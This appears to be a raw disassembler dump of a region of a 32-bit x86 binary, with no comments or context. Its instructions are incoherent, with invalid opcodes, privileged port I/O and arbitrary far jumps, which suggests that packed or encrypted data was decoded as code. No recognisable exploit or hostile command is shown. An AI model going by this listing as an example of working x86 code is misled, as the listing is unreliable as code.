  424d83:	jnp    0x424dbd
  424d85:	cs sub eax,0x58a86782
  424d8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d8c:	hlt    
  424d8d:	ja     0x424db7
  424d8f:	mov    ds,WORD PTR [ebx+0x612f8d04]
  424d95:	push   eax
  424d96:	dec    ebp
  424d97:	xor    ebx,edi
  424d99:	adc    ecx,edi
  424d9b:	adc    ebp,ebx
  424d9d:	ins    DWORD PTR es:[edi],dx
  424d9e:	loop   0x424e10
  424da0:	imul   ebp,DWORD PTR ds:0x9bc7c8f8,0x12
  424da7:	test   BYTE PTR [edx+esi*8-0x449077c1],dl
  424dae:	xchg   ecx,eax
  424daf:	pop    ebp
  424db0:	out    0x61,eax
  424db2:	mov    esp,0x5d4ea915
  424db7:	mov    dh,0x9c
  424db9:	into   
  424dba:	pavgb  mm1,QWORD PTR [eax]
  424dbd:	aas    
  424dbe:	ins    BYTE PTR es:[edi],dx
  424dbf:	call   0x6a62:0x44ba4178
  424dc6:	es pop esi
  424dc8:	sbb    al,0xeb
  424dca:	and    DWORD PTR [edi],edx
  424dcc:	shr    DWORD PTR ds:0xd6a9fa9,0xc0
  424dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424dd4:	int3   
  424dd5:	jecxz  0x424e11
  424dd7:	bound  edi,QWORD PTR [edx*2+0x50785fdf]
  424dde:	loop   0x424e24
  424de0:	mov    edi,0x28b34573
  424de5:	dec    esi
  424de6:	cmp    esp,DWORD PTR [esi]
  424de8:	push   esi
  424de9:	xor    al,BYTE PTR [edi+ecx*2]
  424dec:	test   eax,0xd5ad5446
  424df1:	out    0x50,eax
  424df3:	jecxz  0x424da9
  424df5:	call   0xf049:0x4cc8fa65
  424dfc:	js     0x424e78
  424dfe:	sbb    ebx,edi
  424e00:	sbb    dl,bh
  424e02:	mov    ?,ecx
  424e04:	call   0xf2b2:0xddcce62c
  424e0b:	or     al,0x2
  424e0d:	daa    
  424e0e:	sub    bh,BYTE PTR [ebx+0x97]
	...
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e8b
  424e81:	adc    DWORD PTR [edi+0x18a65da],ebx
  424e87:	add    BYTE PTR ds:0x3f000001,al
  424e8d:	and    al,0x77
  424e8f:	imul   edi,DWORD PTR [esi],0xa7079d5d
  424e95:	jae    0x424f11
  424e97:	addr16 and al,0x80
  424e9a:	sub    BYTE PTR [esi],ch
  424e9c:	mov    ds:0x5e90483a,al
  424ea1:	es pop ds
  424ea3:	sub    al,0x90
  424ea5:	xor    eax,0x90588c34
  424eaa:	add    eax,0x55873d81
  424eaf:	loope  0x424f13
  424eb1:	mul    DWORD PTR [ebx-0x27855c1b]
  424eb7:	mov    bh,0x97
  424eb9:	in     al,dx
  424eba:	lds    edi,FWORD PTR [eax+0x5]
  424ebd:	push   es
  424ebe:	inc    ebx
  424ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ec0:	scas   eax,DWORD PTR es:[edi]
  424ec1:	and    dh,BYTE PTR [edi+0x65]
  424ec4:	sub    BYTE PTR [esi+edi*4-0x73c610ac],bl
  424ecb:	add    al,0x2b
  424ecd:	mov    ds:0xd4edefb2,eax
  424ed2:	jae    0x424e91
  424ed4:	std    
  424ed5:	ja     0x424eec
  424ed7:	mov    dh,0x8a
  424ed9:	sbb    BYTE PTR [ebx],dh
  424edb:	push   ebp
  424edc:	xor    dl,bl
  424ede:	(bad)
  424ee1:	les    eax,FWORD PTR [ecx+0x26]
  424ee4:	mov    dl,0x32
  424ee6:	mov    bh,0xc0
  424ee8:	enter  0xd79b,0x27
  424eec:	cmp    esi,ebx
  424eee:	popa   
  424eef:	mov    bl,0x98
  424ef1:	xor    BYTE PTR [ebp+0x46058ed2],bh
  424ef7:	adc    esi,ebx
  424ef9:	popa   
  424efa:	jl     0x424e86
  424efc:	mov    ecx,DWORD PTR [esp+edx*2-0x1f]
  424f00:	aas    
  424f01:	stc    
  424f02:	test   BYTE PTR [edi],0xf1
  424f05:	out    dx,eax
  424f06:	outs   dx,BYTE PTR ds:[esi]
  424f07:	mov    bl,0xe5
  424f09:	add    eax,0xb3daf4e4
  424f0e:	xchg   edi,eax
  424f0f:	and    al,0x2f
  424f12:	adc    al,0xd2
  424f14:	sub    ch,BYTE PTR [ecx]
  424f16:	iret   
  424f17:	imul   DWORD PTR [ecx]
  424f19:	mov    ds:0x56f681f6,eax
  424f1e:	test   BYTE PTR cs:[eax],dh
  424f21:	mov    ebx,0xd2453e79
  424f26:	mov    al,ds:0xf638d323
  424f2b:	sub    DWORD PTR [edx-0x430c73af],eax
  424f31:	(bad)  
  424f32:	int3   
  424f33:	pop    ds
  424f34:	push   ss
  424f35:	aas    
  424f36:	jl     0x424ee0
  424f38:	loope  0x424edc
  424f3a:	jge    0x424f3e
  424f3c:	xchg   ecx,eax
  424f3d:	push   0xc4a49114
  424f42:	dec    ecx
  424f43:	stc    
  424f44:	push   esp
  424f45:	jo     0x424fa2
  424f47:	loop   0x424edd
  424f49:	lods   al,BYTE PTR ds:[esi]
  424f4a:	push   esp
  424f4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f4c:	sub    DWORD PTR [eax],eax
  424f4e:	mov    ebp,0xe23762e2
  424f53:	or     al,0xff
  424f55:	sub    ah,ch
  424f57:	push   0x540a157f
  424f5c:	int3   
  424f5d:	cmp    ebx,edx
  424f5f:	sbb    edx,esi
  424f61:	inc    ecx
  424f62:	jl     0x424fb7
  424f64:	add    esp,DWORD PTR [ebx-0x5b]
  424f67:	fs xchg ebp,eax
  424f69:	or     ebp,DWORD PTR fs:[ecx-0x4f]
  424f6d:	sub    al,0x11
  424f6f:	inc    esp
  424f70:	fistp  WORD PTR [edx+esi*4+0x25177297]
  424f77:	add    BYTE PTR ds:0x8292ea7e,dl
  424f7d:	pop    es
  424f7e:	je     0x424f75
  424f80:	test   al,0xd6
  424f82:	mov    ebx,ebp
  424f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f85:	dec    ebp
  424f86:	adc    eax,0xc05f934c
  424f8b:	outs   dx,DWORD PTR ds:[esi]
  424f8c:	popa   
  424f8d:	xchg   BYTE PTR [esi+0x8bf6],dh
	...
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	mov    ds:0x6a4fee24,al
  425005:	mov    eax,DWORD PTR [ecx]
  425007:	add    BYTE PTR ds:0x95000001,al
  42500d:	and    edi,DWORD PTR [ebx]
  42500f:	mov    ds:0x66676a4b,al
  425014:	(bad)  
  425015:	(bad)  
  425016:	call   0xce4c6ede
  42501b:	mov    cl,ah
  42501d:	stos   DWORD PTR es:[edi],eax
  42501e:	and    edi,DWORD PTR [eax+0x26d53c32]
  425024:	sub    BYTE PTR [edi-0x1e],dh
  425027:	xor    ebp,DWORD PTR [ecx-0x48]
  42502a:	enter  0xaf3,0x9d
  42502e:	aam    0x2c
  425030:	or     cl,BYTE PTR [ebx+ebp*4+0x4f]
  425034:	sub    al,0x3b
  425036:	sub    al,0xb9
  425038:	in     al,dx
  425039:	jbe    0x425092
  42503b:	ror    dl,1
  42503d:	mov    edx,0x2f49201f
  425042:	inc    esp
  425043:	js     0x424feb
  425045:	cld    
  425046:	neg    DWORD PTR [edi+0x2dad4585]
  42504c:	push   0x873b3a4c
  425051:	or     DWORD PTR ss:[edi+0x64],ebp
  425055:	push   0xe
  425057:	inc    ebx
  425058:	and    eax,esp
  42505a:	push   ebx
  42505b:	daa    
  42505c:	imul   ebx,esi,0xc0cf1795
  425062:	push   eax
  425063:	pushf  
  425064:	sub    ebp,eax
  425066:	jno    0x425006
  425068:	sbb    bh,ch
  42506a:	jns    0x425013
  42506c:	mov    eax,ds:0xd6c81c68
  425071:	aaa    
  425072:	sbb    ebx,DWORD PTR [esi+0x76]
  425075:	and    esi,DWORD PTR [esi+0x221fdb3a]
  42507b:	(bad)  
  42507c:	dec    DWORD PTR [ebp-0x6a901c89]
  425082:	mov    edi,0x3bcf3054
  425087:	inc    ecx
  425088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425089:	lods   eax,DWORD PTR ds:[esi]
  42508a:	push   esp
  42508b:	pop    edx
  42508c:	jns    0x42506d
  42508e:	sub    esp,DWORD PTR [edx]
  425090:	popa   
  425091:	test   BYTE PTR [eax],al
  425093:	loop   0x42502d
  425095:	mov    bl,0xd4
  425097:	test   DWORD PTR [esi],ecx
  425099:	or     DWORD PTR [ebx],ebp
  42509b:	push   eax
  42509c:	dec    ebp
  42509d:	ins    DWORD PTR es:[edi],dx
  42509e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42509f:	es mov ch,al
  4250a2:	inc    edx
  4250a3:	sub    edi,DWORD PTR [eax+0x7d0a928f]
  4250a9:	add    eax,0x5694406c
  4250ae:	pop    ecx
  4250af:	cwde   
  4250b0:	cmp    al,0xaa
  4250b2:	mov    ebp,0x4ae21cdb
  4250b7:	mov    al,0x97
  4250b9:	imul   ebp,DWORD PTR [ecx],0xe3e1f108
  4250bf:	dec    esi
  4250c0:	pushf  
  4250c1:	popa   
  4250c2:	dec    edi
  4250c3:	add    al,dh
  4250c5:	ds jl  0x42506b
  4250c8:	mov    bl,0xa2
  4250ca:	jnp    0x42513b
  4250cc:	sub    al,0xb1
  4250ce:	adc    esi,DWORD PTR [edx-0x77d85756]
  4250d4:	shl    DWORD PTR [eax+0x73],cl
  4250d7:	shl    edx,1
  4250d9:	or     bh,BYTE PTR [ebx+0x448da5bc]
  4250df:	je     0x4250f6
  4250e1:	mov    esp,0xa6fea5e9
  4250e6:	sub    al,0xa3
  4250e8:	inc    ecx
  4250e9:	mov    ds:0xafe213fa,al
  4250ee:	xchg   edi,eax
  4250ef:	and    esi,esi
  4250f1:	push   ebx
  4250f2:	jl     0x425173
  4250f4:	push   esp
  4250f5:	mov    ecx,0x5e8ae966
  4250fa:	xchg   edi,eax
  4250fb:	mov    cl,0x41
  4250fd:	sub    ecx,0xffffff83
  425100:	adc    DWORD PTR [edi-0x64f6f77],edx
  425106:	or     BYTE PTR [ebx+0x517eb521],ah
  42510c:	mov    ebp,0xdc2a51
	...
  425171:	add    BYTE PTR [eax],al
  425173:	add    dh,bl
  425175:	adc    DWORD PTR [edi-0x15020dd],ebx
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x231d:0x41bd92e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0x9b000001,al
  42518d:	nop
  42518e:	pop    eax
  42518f:	aaa    
  425190:	into   
  425191:	cs jno 0x4251d9
  425194:	imul   esi,DWORD PTR [ebx],0x73125681
  42519a:	test   DWORD PTR [esi+edx*8],edi
  42519d:	mov    eax,0xf6827bf4
  4251a2:	xor    DWORD PTR [eax],esi
  4251a4:	mov    dl,0x31
  4251a6:	xor    ebp,eax
  4251a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251a9:	leave  
  4251aa:	bnd jnp 0x42512d
  4251ad:	mov    ds:0x5106742,eax
  4251b2:	(bad)  
  4251b3:	mov    cs:0x53b174fd,eax
  4251b9:	cdq    
  4251ba:	jbe    0x4251e6
  4251bc:	and    DWORD PTR [ebx],eax
  4251be:	jnp    0x42516f
  4251c0:	add    al,BYTE PTR [ebx-0x26]
  4251c3:	pop    eax
  4251c4:	add    ah,al
  4251c6:	add    DWORD PTR [ebx],ebp
  4251c8:	push   ss
  4251c9:	cli    
  4251ca:	leave  
  4251cb:	xchg   esi,eax
  4251cc:	mov    ebx,0x86fdd668
  4251d1:	ficomp DWORD PTR [esp+edi*1+0x73daa1bc]
  4251d8:	xchg   edx,eax
  4251d9:	push   eax
  4251da:	jp     0x4251b6
  4251dc:	mov    ah,0xe4
  4251de:	repnz les edx,FWORD PTR gs:[edi+0x472fb84d]
  4251e6:	stos   BYTE PTR es:[edi],al
  4251e7:	mov    ebx,0x6a106ddd
  4251ec:	jnp    0x4251bd
  4251ee:	iret   
  4251ef:	ds add eax,0x2cec757e
  4251f5:	jmp    0x42519c
  4251f7:	loop   0x4251ca
  4251f9:	(bad)  
  4251fb:	and    BYTE PTR [edx+0x1e],ch
  4251fe:	mov    ebp,DWORD PTR [esi+0x2]
  425201:	sahf   
  425202:	adc    BYTE PTR [eax+0x7291b345],dl
  425208:	unpckhps xmm1,xmm5
  42520b:	(bad)  
  42520c:	jmp    0x1b4a961a
  425211:	xchg   esp,eax
  425212:	push   ebp
  425213:	mov    ds:0x4f5c4417,eax
  425218:	fdiv   QWORD PTR [edx+0x72a65e34]
  42521e:	xchg   DWORD PTR [ebx+edi*4],ecx
  425221:	mov    eax,0x62d1853c
  425226:	pop    esp
  425227:	out    0x59,eax
  425229:	xchg   BYTE PTR [esp+ebp*8+0x55d51da6],dl
  425230:	dec    esi
  425231:	mov    eax,0x1ddb1aef
  425236:	dec    edi
  425237:	loop   0x425253
  425239:	mov    WORD PTR [esp+edi*2-0x7378b372],?
  425240:	fwait
  425241:	pop    DWORD PTR [ebx+0x32]
  425244:	iret   
  425245:	addr16 out 0x1a,al
  425248:	pushf  
  425249:	sbb    ecx,ebp
  42524b:	or     ecx,DWORD PTR [eax+0x2571281f]
  425251:	popf   
  425252:	mov    eax,ds:0x26f5facb
  425257:	loopne 0x425266
  425259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42525a:	fwait
  42525b:	cmp    edi,DWORD PTR [ebx+edx*2+0x6d]
  42525f:	loope  0x425246
  425261:	inc    eax
  425262:	(bad)  
  425263:	add    BYTE PTR [edx+0x17f0b19e],bl
  425269:	inc    ecx
  42526a:	(bad)  [ebx+0x61]
  42526d:	loope  0x4252d2
  42526f:	adc    al,0x45
  425271:	mul    BYTE PTR [edx-0x10c3070a]
  425277:	test   DWORD PTR [esp+edi*8+0x6e70d28],ebx
  42527e:	repz xor al,0x7c
  425281:	les    ebp,FWORD PTR [ebp-0xb]
  425284:	pop    ss
  425285:	sub    ch,BYTE PTR [esp+ecx*4+0x5d19e649]
  42528c:	rcr    DWORD PTR [ecx+esi*1-0x34],1
  425290:	add    al,0x0
	...
  4252f2:	add    BYTE PTR [eax],al
  4252f4:	lods   al,BYTE PTR ds:[esi]
  4252f5:	les    esi,FWORD PTR [ebx-0x32]
  4252f8:	jnp    0x4252f9
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	sub    al,0xfa
  425302:	mov    bh,0xfb
  425304:	je     0x425293
  425306:	add    DWORD PTR [eax],eax
  425308:	add    eax,0x54000001
  42530d:	hlt    
  42530e:	jne    0x4252ad
  425310:	cli    
  425311:	or     dl,BYTE PTR [edx+0x6b17c139]
  425317:	inc    ebp
  425318:	(bad)  
  425319:	(bad)  
  42531b:	mov    al,0x92
  42531d:	inc    ecx
  42531e:	arpl   WORD PTR [ebx+0x55f8f3e3],dx
  425324:	dec    edx
  425325:	add    cl,cl
  425327:	jecxz  0x42537f
  425329:	mov    ebp,0xa304fa6c
  42532e:	xchg   DWORD PTR [edi],ecx
  425330:	xor    al,0xa8
  425332:	mov    ebx,0xcbb8c3c
  425337:	loopne 0x425398
  425339:	lods   al,BYTE PTR ds:[esi]
  42533a:	cmp    DWORD PTR [ebp-0x62],eax
  42533d:	adc    eax,0xc554eaf3
  425342:	jecxz  0x425360
  425344:	dec    edi
  425345:	mov    bh,0xe5
  425347:	inc    ebp
  425348:	xchg   edi,eax
  425349:	xor    BYTE PTR [ebp+0x7e],bh
  42534c:	fidivr DWORD PTR [ecx+0x4f90b3c0]
  425352:	cli    
  425353:	mul    DWORD PTR [edi]
  425355:	adc    DWORD PTR [ebx+0x63fc9de7],eax
  42535b:	push   esp
  42535c:	rcr    BYTE PTR [esi+ecx*8-0xbc00c3b],cl
  425363:	shl    DWORD PTR [edx+edi*1],1
  425366:	cld    
  425367:	scas   al,BYTE PTR es:[edi]
  425368:	fcmovu st,st(0)
  42536a:	aas    
  42536b:	in     eax,dx
  42536c:	jle    0x42539a
  42536e:	jecxz  0x42536a
  425370:	in     eax,0xd8
  425372:	ret    
  425373:	and    eax,0x8f02959e
  425378:	data16 int3 
  42537a:	or     eax,0x6112e772
  42537f:	mov    esp,0xd9a0d5bd
  425384:	adc    BYTE PTR [ecx],ah
  425386:	gs pop esp
  425388:	dec    edi
  425389:	push   es
  42538a:	sub    al,0x64
  42538c:	cmp    ah,dh
  42538e:	push   eax
  42538f:	xchg   DWORD PTR [ecx-0x2a],edx
  425392:	sbb    dh,BYTE PTR [ecx]
  425394:	fstp   TBYTE PTR [esi+0x0]
  425397:	enter  0x5eba,0x5c
  42539b:	retf   
  42539c:	add    al,0x6f
  42539e:	jo     0x425355
  4253a0:	icebp  
  4253a1:	out    dx,eax
  4253a2:	push   eax
  4253a3:	sahf   
  4253a4:	stos   BYTE PTR es:[edi],al
  4253a5:	shr    BYTE PTR [esi],cl
  4253a7:	dec    edx
  4253a8:	ds pop esi
  4253aa:	out    0x62,al
  4253ac:	mov    ecx,0xf937e2e8
  4253b1:	inc    ebp
  4253b2:	or     ah,BYTE PTR [eax+0xb9714d8]
  4253b8:	scas   al,BYTE PTR es:[edi]
  4253b9:	xor    edi,ebx
  4253bb:	or     edi,DWORD PTR [ecx+0x5d19994]
  4253c1:	popa   
  4253c2:	std    
  4253c3:	jae    0x4253d3
  4253c5:	or     BYTE PTR [ecx+0x771f8ced],dh
  4253cb:	xchg   edx,eax
  4253cc:	jbe    0x425439
  4253ce:	lods   eax,DWORD PTR ds:[esi]
  4253cf:	dec    esi
  4253d0:	add    BYTE PTR [edi],dl
  4253d2:	mov    ds:0x991cac81,eax
  4253d7:	push   es
  4253d8:	xchg   BYTE PTR gs:[esp+edx*8+0x24],dh
  4253dd:	dec    BYTE PTR [edi-0x3a]
  4253e0:	popa   
  4253e1:	push   ecx
  4253e2:	iret   
  4253e3:	fcomp  QWORD PTR [edx+esi*4+0x2dff1745]
  4253ea:	outs   dx,BYTE PTR ds:[esi]
  4253eb:	xchg   ebx,edx
  4253ed:	ret    0xc8a9
  4253f0:	repnz push edi
  4253f2:	add    eax,DWORD PTR [edx-0x2a229df6]
  4253f8:	out    dx,al
  4253f9:	xor    BYTE PTR [esi+0x3a],dl
  4253fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253fd:	dec    ecx
  4253fe:	test   DWORD PTR [eax-0x19],ebx
  425401:	or     al,0x3c
  425403:	pusha  
  425404:	mov    eax,0x53a23a36
  425409:	or     cl,BYTE PTR [ebx+0x51]
  42540c:	retf   
  42540d:	gs mov bh,0xff
	...
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    esi,DWORD PTR [esi]
  425481:	icebp  
  425482:	adc    dh,BYTE PTR [edx]
  425484:	jns    0x425414
  425486:	add    DWORD PTR [eax],eax
  425488:	add    eax,0xc0000001
  42548d:	out    0x9c,al
  42548f:	lds    ebx,FWORD PTR [ecx-0x5c]
  425492:	push   ss
  425493:	loop   0x42546d
  425495:	xchg   esi,eax
  425496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425497:	fldenv [esi+0x70902ab2]
  42549d:	jp     0x425421
  42549f:	lea    ecx,[eax]
  4254a1:	jle    0x4254d1
  4254a3:	or     DWORD PTR [ecx],0x450f8836
  4254a9:	mov    al,0xb9
  4254ab:	sub    esp,esi
  4254ad:	loope  0x4254f0
  4254af:	inc    esi
  4254b0:	xchg   esi,eax
  4254b1:	and    edx,DWORD PTR [eax+0x7595434]
  4254b7:	xchg   BYTE PTR [ebx],al
  4254b9:	jae    0x4254d7
  4254bb:	push   ecx
  4254bc:	test   al,0xff
  4254be:	push   0x6ce56be1
  4254c3:	pop    ecx
  4254c4:	jmp    0xde8fc5b3
  4254c9:	shl    BYTE PTR [ebx+0x63],0x8d
  4254cd:	push   edx
  4254ce:	mov    ax,ds:0x2c4a1367
  4254d4:	xchg   ecx,eax
  4254d5:	add    al,dh
  4254d7:	cld    
  4254d8:	lock or DWORD PTR [eax+0x16],edx
  4254dc:	stos   DWORD PTR es:[edi],eax
  4254dd:	stc    
  4254de:	mov    ds:0x7231a17,al
  4254e3:	adc    edi,ebx
  4254e5:	test   eax,0xe041b001
  4254ea:	enter  0x978a,0xa8
  4254ee:	lea    ecx,[eax]
  4254f0:	push   ebp
  4254f1:	jae    0x425529
  4254f3:	jge    0x4254e8
  4254f5:	stos   BYTE PTR es:[edi],al
  4254f6:	or     ebx,DWORD PTR [edi]
  4254f8:	mov    WORD PTR [esi+0x7c],es
  4254fb:	or     BYTE PTR [esi+0x71],ah
  4254fe:	xchg   esp,eax
  4254ff:	sub    al,0x80
  425501:	push   0x5a
  425503:	sub    DWORD PTR ds:0xcc8979eb,ebx
  425509:	xchg   ebp,eax
  42550a:	pop    ebx
  42550b:	jle    0x425566
  42550d:	fnsave [esi-0x363605d5]
  425513:	imul   edx,DWORD PTR [ecx],0x54
  425516:	cld    
  425517:	and    eax,0x8491d37d
  42551c:	test   DWORD PTR ds:[esi+0x68],ecx
  425520:	add    BYTE PTR [ecx],al
  425522:	sbb    al,0x43
  425524:	xor    al,0xe
  425526:	outs   dx,BYTE PTR ds:[esi]
  425527:	out    0x36,al
  425529:	or     edx,0x5ab11c3c
  42552f:	addr16 retf 0xdc47
  425533:	stos   BYTE PTR es:[edi],al
  425534:	enter  0x648d,0x63
  425538:	or     ebp,eax
  42553a:	adc    bl,BYTE PTR [edi]
  42553c:	stos   BYTE PTR es:[edi],al
  42553d:	xchg   edi,eax
  42553e:	mul    DWORD PTR [edx+0x182314cf]
  425544:	mov    ds:0xf2af3251,al
  425549:	mov    es:0x652184f6,al
  42554f:	pop    ecx
  425550:	and    bl,BYTE PTR [edx-0x7feee195]
  425556:	mov    ds:0xd453d2bf,al
  42555b:	xlat   BYTE PTR ds:[ebx]
  42555c:	pop    ecx
  42555d:	pop    eax
  42555e:	cmp    eax,0xda1e97c9
  425563:	mov    edi,0x23df41e3
  425568:	mov    bl,0x14
  42556a:	pushf  
  42556b:	test   DWORD PTR [eax-0x11],0x8ace0de8
  425572:	popf   
  425573:	arpl   WORD PTR [edx-0x35c29dc9],di
  425579:	inc    esi
  42557a:	(bad)  
  42557b:	icebp  
  42557c:	stc    
  42557d:	and    ebx,DWORD PTR [eax+0x65f6ffea]
  425583:	cmc    
  425584:	stc    
  425585:	js     0x425518
  425587:	mov    eax,0xe41b3cd9
  42558c:	cmc    
  42558d:	inc    edx
  42558e:	loope  0x42558b
  425590:	jg     0x425592
	...
  4255f2:	add    BYTE PTR [eax],al
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x914df13a
  425602:	sub    al,dh
  425604:	jle    0x425595
  425606:	add    DWORD PTR [eax],eax
  425608:	add    eax,0xe7000001
  42560d:	test   BYTE PTR [esi-0x5b4d60de],0x23
  425614:	inc    esi
  425615:	ss jle 0x42566b
  425618:	xor    edi,ebx
  42561a:	sti    
  42561b:	inc    ecx
  42561c:	shl    esp,1
  42561e:	xchg   DWORD PTR [ebx],esp
  425620:	test   BYTE PTR [ecx+0x68e4f5a2],bh
  425626:	dec    edx
  425627:	jno    0x425635
  425629:	mov    DWORD PTR [ecx+0x65211d95],edi
  42562f:	sahf   
  425630:	mov    al,ds:0x32216134
  425635:	hlt    
  425636:	jge    0x425648
  425638:	and    ebp,DWORD PTR [edx-0x52]
  42563b:	arpl   bx,ax
  42563d:	test   eax,0x1d65fefb
  425642:	arpl   WORD PTR [edx+0x6f50a76a],bx
  425648:	adc    al,0xff
  42564a:	rol    BYTE PTR [ebx-0x62],1
  42564d:	mov    bl,0x2
  42564f:	pop    esp
  425650:	div    DWORD PTR [ebp+0x23]
  425653:	push   ecx
  425654:	stos   BYTE PTR es:[edi],al
  425655:	jns    0x42562d
  425657:	outs   dx,DWORD PTR ds:[esi]
  425658:	xor    BYTE PTR [ebp+0x63],al
  42565b:	rcl    DWORD PTR [ebx],0x3a
  42565e:	in     al,0x20
  425660:	push   eax
  425661:	js     0x4256d7
  425663:	nop
  425664:	pushf  
  425665:	ins    BYTE PTR es:[edi],dx
  425666:	mov    bl,0x9f
  425668:	xor    BYTE PTR [edx+0x557d0297],dl
  42566e:	adc    dh,dl
  425670:	push   ebp
  425671:	int3   
  425672:	xlat   BYTE PTR ds:[ebx]
  425673:	fwait
  425674:	(bad)  
  425675:	bound  edx,QWORD PTR [edx]
  425677:	sub    ecx,esp
  425679:	fiadd  DWORD PTR [ebx]
  42567b:	(bad)  
  42567c:	aaa    
  42567d:	push   esi
  42567e:	ins    DWORD PTR es:[edi],dx
  42567f:	fs out dx,al
  425681:	lds    edx,FWORD PTR [ebx]
  425683:	call   0x2048:0x928efbbd
  42568a:	push   ds
  42568b:	stos   DWORD PTR es:[edi],eax
  42568c:	sahf   
  42568d:	sub    al,dl
  42568f:	xor    al,0x4
  425691:	retf   0x23ae
  425694:	xor    BYTE PTR [esi+0x1a],ch
  425697:	pop    eax
  425698:	and    DWORD PTR [ebx-0x29],edx
  42569b:	imul   ecx,DWORD PTR [edi-0x48],0xc
  42569f:	(bad)  [ebx]
  4256a1:	mov    ecx,0xb6dbda8f
  4256a6:	inc    esi
  4256a7:	inc    edx
  4256a8:	mov    ds:0xcdd0ef68,eax
  4256ad:	in     al,dx
  4256ae:	stos   BYTE PTR es:[edi],al
  4256af:	pushf  
  4256b0:	mov    eax,0x93c1c7b4
  4256b5:	cwde   
  4256b6:	push   edx
  4256b7:	aas    
  4256b8:	push   es
  4256b9:	jmp    FWORD PTR [edi]
  4256bb:	into   
  4256bc:	leave  
  4256bd:	ss cs repnz push ds
  4256c1:	sar    DWORD PTR [esi],1
  4256c3:	cdq    
  4256c4:	sub    DWORD PTR [eax],esi
  4256c6:	out    0x75,eax
  4256c8:	dec    ebp
  4256c9:	out    dx,eax
  4256ca:	aas    
  4256cb:	ret    0x8288
  4256ce:	retf   
  4256cf:	sbb    al,0xf2
  4256d1:	mov    dh,0x13
  4256d3:	or     al,0xf
  4256d5:	jl     0x4256c8
  4256d7:	cmp    ch,BYTE PTR [eax+0x57]
  4256da:	pop    ebx
  4256db:	push   ebp
  4256dc:	outs   dx,DWORD PTR ds:[esi]
  4256dd:	call   0xb698e2fb
  4256e2:	retf   
  4256e3:	sbb    DWORD PTR ds:0x31fdd705,ebx
  4256e9:	imul   ebx,ebp,0x3a
  4256ec:	out    0x21,eax
  4256ee:	xchg   esp,eax
  4256ef:	fsubr  DWORD PTR [esi-0x55231daa]
  4256f5:	sar    DWORD PTR [ecx-0x7f],cl
  4256f8:	das    
  4256f9:	rcl    BYTE PTR [esi],1
  4256fb:	sub    cl,BYTE PTR [eax+eiz*2+0x1a]
  4256ff:	aaa    
  425700:	cmp    BYTE PTR [ebp+0x6a855317],ch
  425706:	nop
  425707:	inc    esi
  425708:	push   ecx
  425709:	cmp    ebp,DWORD PTR [ecx]
  42570b:	inc    ecx
  42570c:	dec    esp
  42570d:	(bad)  
  42570e:	arpl   WORD PTR [ecx+0x35],dx
	...
  425774:	(bad)  
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x9e810274
  425783:	sub    eax,0x19083
  425788:	add    eax,0xd5000001
  42578d:	leave  
  42578e:	xchg   ecx,eax
  42578f:	pop    es
  425790:	ja     0x42578e
  425792:	xchg   ecx,eax
  425793:	pop    ecx
  425794:	je     0x425756
  425796:	push   ss
  425797:	or     eax,0x24dbed5e
  42579c:	ret    0x729a
  42579f:	xchg   ebp,eax
  4257a0:	push   esp
  4257a1:	xor    eax,0x94fb7197
  4257a6:	(bad)  
  4257a7:	pop    ebx
  4257a8:	sub    BYTE PTR [edx],ch
  4257aa:	gs or  eax,0x752111bb
  4257b0:	xor    al,0xc4
  4257b2:	mov    bl,0x46
  4257b4:	lock cwde 
  4257b6:	add    bh,BYTE PTR [esi-0x71]
  4257b9:	(bad)  
  4257ba:	nop
  4257bb:	(bad)  
  4257bc:	(bad)  
  4257bd:	aam    0xf0
  4257bf:	psubsb mm7,QWORD PTR [edi-0x304e0aa6]
  4257c6:	inc    esp
  4257c7:	jmp    0x4257c4
  4257c9:	xchg   esp,eax
  4257ca:	pop    edi
  4257cb:	loop   0x425799
  4257cd:	mov    al,ch
  4257cf:	and    edx,DWORD PTR [esi+eiz*8+0xefde02f]
  4257d6:	or     BYTE PTR [di+0x77d9],ch
  4257db:	pop    ebp
  4257dc:	addr16 jo 0x425824
  4257df:	push   0xffffff88
  4257e1:	lods   al,BYTE PTR ds:[esi]
  4257e2:	xor    eax,0x14e693fc
  4257e7:	aas    
  4257e8:	cmp    bh,ah
  4257ea:	pop    sp
  4257ec:	ss out dx,eax
  4257ee:	(bad)  
  4257ef:	mov    eax,0x8accf024
  4257f4:	fiadd  WORD PTR [esi+ebp*8-0x484c9300]
  4257fb:	sbb    DWORD PTR [edi+ebx*2+0x19],esp
  4257ff:	popa   
  425800:	jl     0x425830
  425802:	ss pop ebp
  425804:	sti    
  425805:	add    eax,0x63077daa
  42580a:	outs   dx,BYTE PTR ds:[esi]
  42580b:	bound  ebx,QWORD PTR [eax+0x9]
  42580e:	adc    bl,BYTE PTR [edi-0x13eb42ef]
